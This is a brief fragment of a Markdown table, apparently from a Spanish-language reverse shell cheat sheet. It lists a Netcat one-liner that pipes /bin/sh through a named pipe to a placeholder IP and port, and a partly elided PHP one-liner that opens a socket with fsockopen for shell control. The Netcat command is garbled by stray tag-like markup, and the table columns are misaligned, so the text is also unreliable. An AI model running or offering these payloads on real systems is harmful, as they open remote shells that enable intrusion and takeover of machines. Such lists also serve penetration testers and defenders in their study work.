...
| --- | --- | --- | --- |
| **Netcat** | \`mkfifo /tmp/f; nc <ip><port>< /tmp/f</port></ip> | /bin/sh >/tmp/f 2>&1; rm /tmp/f\` | Usa pipe para simular stdin/stdout sobre socket TCP |
...
| **PHP** | `php -r '$sock=fsockopen("<IP>",<PORT>); ...'` | Socket PHP + proc_open para control shell |     |
